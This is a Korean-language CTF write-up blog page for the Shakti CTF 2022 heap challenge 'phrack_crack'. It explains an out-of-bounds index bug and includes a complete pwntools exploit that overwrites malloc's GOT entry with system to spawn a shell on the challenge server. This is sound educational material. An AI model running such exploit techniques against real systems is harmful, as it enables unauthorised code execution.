@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Info(9&#x2F;387) solves Hard descriptionphrack_phrack_phrack_crack_crack_crack.Note: The server is running on Ubuntu 20.04.Author: d1g174l_f0rtr355 for player1234.├── ld.so.2├── libc.so.6└── phrack_cr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shakti CTF 2022 - phrack_crack (hard)">
+<meta property="og:url" content="https://jiravvit.github.io/2022/12/22/221222-shaktictf2022-phrack_crack/index.html">
+<meta property="og:site_name" content="jir4vvit">
+<meta property="og:description" content="Info(9&#x2F;387) solves Hard descriptionphrack_phrack_phrack_crack_crack_crack.Note: The server is running on Ubuntu 20.04.Author: d1g174l_f0rtr355 for player1234.├── ld.so.2├── libc.so.6└── phrack_cr">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-12-21T23:00:00.000Z">
+<meta property="article:modified_time" content="2022-12-22T19:49:19.173Z">
+<meta property="article:author" content="jir4vvit">
+<meta property="article:tag" content="oob">
+<meta name="twitter:card" content="summary">
+    
+    
+    <!-- title -->
+    <title>Shakti CTF 2022 - phrack_crack (hard)</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/12/22/221222-shaktictf2022-ropwork/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/12/14/221214-shaktictf2022-game_of_thrones/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/2022/12/22/221222-shaktictf2022-phrack_crack/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/2022/12/22/221222-shaktictf2022-phrack_crack/&text=Shakti CTF 2022 - phrack_crack (hard)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/2022/12/22/221222-shaktictf2022-phrack_crack/&title=Shakti CTF 2022 - phrack_crack (hard)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/2022/12/22/221222-shaktictf2022-phrack_crack/&is_video=false&description=Shakti CTF 2022 - phrack_crack (hard)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Shakti CTF 2022 - phrack_crack (hard)&body=Check out this article: https://jiravvit.github.io/2022/12/22/221222-shaktictf2022-phrack_crack/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/2022/12/22/221222-shaktictf2022-phrack_crack/&title=Shakti CTF 2022 - phrack_crack (hard)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/2022/12/22/221222-shaktictf2022-phrack_crack/&title=Shakti CTF 2022 - phrack_crack (hard)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/2022/12/22/221222-shaktictf2022-phrack_crack/&title=Shakti CTF 2022 - phrack_crack (hard)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/2022/12/22/221222-shaktictf2022-phrack_crack/&title=Shakti CTF 2022 - phrack_crack (hard)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/2022/12/22/221222-shaktictf2022-phrack_crack/&name=Shakti CTF 2022 - phrack_crack (hard)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/2022/12/22/221222-shaktictf2022-phrack_crack/&t=Shakti CTF 2022 - phrack_crack (hard)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Info"><span class="toc-number">1.</span> <span class="toc-text">Info</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#description"><span class="toc-number">1.1.</span> <span class="toc-text">description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#for-player"><span class="toc-number">1.2.</span> <span class="toc-text">for player</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Analysis"><span class="toc-number"></span> <span class="toc-text">Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Mitigation"><span class="toc-number">0.1.</span> <span class="toc-text">Mitigation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Source-Code"><span class="toc-number">0.2.</span> <span class="toc-text">Source Code</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability"><span class="toc-number">1.</span> <span class="toc-text">Vulnerability</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">2.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Scenario"><span class="toc-number">2.1.</span> <span class="toc-text">Exploit Scenario</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">2.2.</span> <span class="toc-text">Exploit Code</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tmi"><span class="toc-number">3.</span> <span class="toc-text">tmi</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Shakti CTF 2022 - phrack_crack (hard)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">jir4vvit</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-12-21T23:00:00.000Z" itemprop="datePublished">2022-12-22</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/WriteUp/">WriteUp</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/oob/" rel="tag">oob</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(9&#x2F;387) solves</p>
+<p>Hard</p>
+<h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>phrack_phrack_phrack_crack_crack_crack.<br>Note: The server is running on Ubuntu 20.04.<br>Author: d1g174l_f0rtr355</p>
+<h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── ld.so.2</span><br><span class="line">├── libc.so.6</span><br><span class="line">└── phrack_crack</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phrack_crack: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=06dd3b9850dc326bd98cb17e0049bcec4bd15219, not stripped</span><br></pre></td></tr></table></figure>
+
+<p>ld와 libc가 주어졌으니 patchelf를 이용해서 패치해주고 문제풀이를 하였다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">linux-vdso.so.1 (0x00007ffc78b1f000)</span><br><span class="line">./libc.so.6 (0x00007f8d6e200000)</span><br><span class="line">./ld.so.2 =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007f8d6e69d000)</span><br></pre></td></tr></table></figure>
+
+<h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3fd000)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">=======================</span><br><span class="line"> | Welcome Phrack 66 |</span><br><span class="line">=======================</span><br><span class="line"></span><br><span class="line">Here&#x27;s a generous leak for you! 0x7fc34a06dba0</span><br><span class="line"></span><br><span class="line">Here&#x27;s one more generous leak for you: 0x961220</span><br><span class="line"></span><br><span class="line">MENU</span><br><span class="line"></span><br><span class="line">1. malloc 0/4</span><br><span class="line">2. edit</span><br><span class="line">3. target</span><br><span class="line">4. quit</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+
+<p>원하는 사이즈만큼 힙에 데이터를 할당 가능하고.. 원하는 인덱스(?)에 내용을 수정 가능하다.</p>
+<h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter index: &quot;</span>);</span><br><span class="line">  v5 = getint(<span class="number">8LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No negative indices allowed!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;maximum requests reached!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !m_array[v5] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Index not allocated!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;data: &quot;</span>);</span><br><span class="line">  get_inp(m_array[v5], (<span class="type">unsigned</span> <span class="type">int</span>)(size + <span class="number">10</span>));</span><br></pre></td></tr></table></figure>
+
+<p>인덱스를 입력받지만 정작 검증하는 인덱스는 엉뚱한 값이라서 oob가 발생한다. </p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><p>출력해주는 값을 통해 립시 베이스랑 힙 주소를 자연스럽게 알 수 있다.<br>1번 메뉴를 이용하여 힙을 할당한 다음 malloc got를 적어놓고 oob가 발생하니 malloc got가 써진 주소에 접근해서 2번 메뉴를 이용하여 malloc got를 system 주소로 덮을 수 있다.<br>그리고 다시 1번 메뉴를 이용하면 system으로 덮혀진 malloc이 실행될텐데 이때 인자를 우리의 입력값으로 조절할 수 있다. &#x2F;bin&#x2F;sh를 보내주면 성공.</p>
+<h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;65.2.136.80&#x27;</span>, <span class="number">30930</span>)</span><br><span class="line">libc = e.libc</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">info(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libc.address = leak - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">heap = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>)</span><br><span class="line">info(<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">heap = heap + <span class="number">0x10e0</span></span><br><span class="line">idx = (heap-<span class="number">0x4040c0</span>)//<span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(idx)</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc , malloc_got</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="built_in">str</span>(<span class="number">10</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, p64(<span class="number">0x404048</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc_got -&gt; system</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">&#x27;data:&#x27;</span>, p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">binsh = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="built_in">str</span>(binsh))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><p>너무 늦게 롸업을 작성한다 ㅎ.. 개인적으로 문제 코드에 malloc이 나오면 긴장하는 편인데 바로 취약점을 찾고 생각보다 빠르게 익스했던 기억이 난다.</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Info"><span class="toc-number">1.</span> <span class="toc-text">Info</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#description"><span class="toc-number">1.1.</span> <span class="toc-text">description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#for-player"><span class="toc-number">1.2.</span> <span class="toc-text">for player</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Analysis"><span class="toc-number"></span> <span class="toc-text">Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Mitigation"><span class="toc-number">0.1.</span> <span class="toc-text">Mitigation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Source-Code"><span class="toc-number">0.2.</span> <span class="toc-text">Source Code</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability"><span class="toc-number">1.</span> <span class="toc-text">Vulnerability</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">2.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Scenario"><span class="toc-number">2.1.</span> <span class="toc-text">Exploit Scenario</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">2.2.</span> <span class="toc-text">Exploit Code</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tmi"><span class="toc-number">3.</span> <span class="toc-text">tmi</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/2022/12/22/221222-shaktictf2022-phrack_crack/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/2022/12/22/221222-shaktictf2022-phrack_crack/&text=Shakti CTF 2022 - phrack_crack (hard)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/2022/12/22/221222-shaktictf2022-phrack_crack/&title=Shakti CTF 2022 - phrack_crack (hard)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/2022/12/22/221222-shaktictf2022-phrack_crack/&is_video=false&description=Shakti CTF 2022 - phrack_crack (hard)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Shakti CTF 2022 - phrack_crack (hard)&body=Check out this article: https://jiravvit.github.io/2022/12/22/221222-shaktictf2022-phrack_crack/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/2022/12/22/221222-shaktictf2022-phrack_crack/&title=Shakti CTF 2022 - phrack_crack (hard)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/2022/12/22/221222-shaktictf2022-phrack_crack/&title=Shakti CTF 2022 - phrack_crack (hard)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/2022/12/22/221222-shaktictf2022-phrack_crack/&title=Shakti CTF 2022 - phrack_crack (hard)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/2022/12/22/221222-shaktictf2022-phrack_crack/&title=Shakti CTF 2022 - phrack_crack (hard)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/2022/12/22/221222-shaktictf2022-phrack_crack/&name=Shakti CTF 2022 - phrack_crack (hard)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/2022/12/22/221222-shaktictf2022-phrack_crack/&t=Shakti CTF 2022 - phrack_crack (hard)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022
+    jir4vvit
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'jiravvit-github-io';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
